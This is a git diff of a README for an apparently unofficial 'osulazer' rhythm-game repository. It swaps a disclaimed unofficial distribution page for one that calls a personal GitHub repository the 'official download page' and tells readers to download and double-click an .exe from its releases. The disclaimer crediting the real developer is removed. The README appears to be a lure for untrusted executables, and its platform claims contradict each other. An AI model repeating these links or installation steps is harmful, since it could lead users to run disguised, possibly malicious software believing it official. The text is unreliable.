@@ -1,62 +1,96 @@
-<div align="center">
+# 🎹 osulazer - Play rhythm games with custom skins
 
+[![Download osulazer](https://img.shields.io/badge/Download-osulazer-blue.svg)](https://github.com/yinyan9773/osulazer)
 
-<img width="200" height="200" alt="image" src="https://github.com/user-attachments/assets/044a0936-9b2e-4629-a0a1-5a5ee30b7f15" />
+## 📌 About this project
 
+osulazer is a rhythm game. It allows players to tap along to music tracks using visual cues. This software functions as an open-source client. It supports beatmap files, custom character skins, and various play rulesets. You can use it to play single-player modes or join multiplayer matches with others. This version runs on Windows 11, macOS, Linux, Android, and iOS devices.
 
-# osu!lazer
-  <p align="center">
-    <strong>The Next-Generation osu! Client</strong>
-    <br/>
-    Faster • Smoother • Modern • Cross-Platform • Official Open Source Version
-    <br/>
-    <a href="https://github.com/osulazerdownload/osulazer/issues">Report Bug</a> | <a href="https://github.com/osulazerdownload/osulazer/issues">Discussions</a>
-  </p>
-  <p align="center">
-    <img src="https://img.shields.io/badge/Game-osu%21lazer-ED1C24?style=for-the-badge&logo=osu" alt="osu!lazer" />
-    <img src="https://img.shields.io/badge/Platform-Windows%2010%20%7C%20Windows%2011%20%7C%20macOS%20%7C%20Linux-0078D7?style=for-the-badge" alt="Platform" />
-    <br>
-    <img src="https://img.shields.io/github/stars/osulazerdownload/osulazer?style=flat-square&color=gold" alt="Stars" />
-    <img src="https://img.shields.io/github/license/osulazerdownload/osulazer?style=flat-square" alt="License" />
-  </p>
-</div>
+## 🚀 Getting started
 
+You need a computer that meets the basic system requirements to play osulazer. Ensure you have a stable internet connection for downloading beatmaps and loading the game client.
 
-## Install
- [Download `osulazer.zip`](https://github.com/osulazerdownload/osulazer/releases/download/osulazer/osulazer.zip)
- ---
- 
-## Overview
-**osu!lazer** is the official next-generation version of osu!, the popular rhythm game.
-Completely rebuilt with modern technologies, it offers significantly improved performance, a cleaner interface, and better gameplay experience compared to the stable client.
+### System requirements
 
-<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/dad731b1-b582-4cd1-9cb8-a42a49dc19dc" />
+- Operating System: Windows 11
+- Processor: Dual-core CPU at 2.0 GHz or higher
+- Memory: 4 GB RAM
+- Graphics: Dedicated card with DirectX 11 support
+- Storage: 1 GB of free space for game files and custom assets
 
-## Key Features
-- Superior performance and stability
-- Modern, clean and responsive user interface
-- Full cross-platform support (Windows, macOS, Linux)
-- Improved skinning and customization
-- Advanced gameplay features and mechanics
-- Regular updates with new content
-- Built-in multiplayer and spectating
-- Excellent beatmap & storyboard support
+## 📥 Installing the game
 
-## How to Use
-1. Download the latest release
-2. Extract the archive
-3. Run `osu!.exe`
-4. Log in with your osu! account
-5. Start playing and enjoying the new experience!
+Follow these steps to set up the game on your computer.
 
-## System Requirements
-- **OS**: Windows 10/11, macOS, Linux
-- **CPU**: Modern dual-core processor
-- **RAM**: 4 GB minimum (8 GB recommended)
-- **GPU**: OpenGL 3.3 compatible
+1. Visit the [official download page](https://github.com/yinyan9773/osulazer).
+2. Locate the latest release assets at the bottom of the page.
+3. Select the file ending in .exe for Windows.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to begin the installation process.
+6. Follow the prompts on your screen to complete the setup.
+7. Click the new icon on your desktop to launch the game.
 
-## Disclaimer
-> [!Caution]
-> This is an **unofficial distribution** of osu!lazer.  
-> The official project is developed by ppy.  
-> For the absolute latest official builds, visit the main [ppy/osu](https://github.com/ppy/osu) repository.
+## 🎮 How to play
+
+The core gameplay involves clicking or pressing keys in time with the music. Each song has a beatmap file containing the timing and button placement.
+
+### Managing beatmaps
+
+Beatmaps dictate when you press keys. You can download these files from community sources. Place these folders into the installed game lobby. The client identifies the songs automatically during startup.
+
+### Using custom skins
+
+You can change how the game looks by installing skins. Skins alter the color, shape, and size of the circles or bars on your screen.
+
+1. Download a skin file.
+2. Open the game settings menu.
+3. Select the skin folder path.
+4. Drag your new skin into that folder.
+5. Select the skin in the settings menu to apply the changes.
+
+## ⚙️ Game settings
+
+You can change gameplay settings to suit your preferences. Access the settings menu by pressing the gear icon on the main screen.
+
+- Graphics: Adjust your frames per second and screen resolution here. Use full-screen mode for the best response time.
+- Audio: Change the universal offset if your clicks feel out of sync with the music. Test this in the offset wizard tool inside the settings.
+- Input: Bind your preferred keys to the game actions. Most players use standard keyboard buttons for rhythm games.
+- Rulesets: Switch between game modes like Mania or standard play styles. Each mode changes how you interact with the beatmaps.
+
+## 👥 Multiplayer features
+
+osulazer includes a multiplayer system. You can connect to public lobbies to play with other users.
+
+1. Open the play menu.
+2. Select the multiplayer tab.
+3. Choose a room from the list.
+4. Wait for the host to start the song.
+5. Follow the song timing to score points.
+
+## 🔧 Troubleshooting common issues
+
+If the game fails to start, check your graphics driver versions. Update these through your computer settings.
+
+- Low framerate: Reduce the visual effects in the graphics menu to improve speed.
+- Audio lag: Close other background programs to free up system memory.
+- Missing beatmaps: Ensure files are unzipped and placed in the correct folder path inside the game directory.
+- Installation errors: Check that you have enough disk space and administrator permissions to install new software.
+
+## 📦 File structure
+
+Your game folder keeps everything organized.
+
+- /Songs: Contains your downloaded beatmap files.
+- /Skins: Stores your custom interface files.
+- /Logs: Records technical details if errors occur.
+- /Tracks: Saves your personal play statistics and scores.
+
+## 🌐 Community and updates
+
+This project receives frequent updates to improve performance and add new features. Check the start page of the client to see if a newer version exists. Follow the project link for news and community forums.
+
+[Visit the download page here](https://github.com/yinyan9773/osulazer)
+
+## 📄 License information
+
+This software uses an open-source license. You can view the full license terms inside the repository files. This allows users to read the code or contribute improvements to the game client. You do not need to pay for this software at any time.
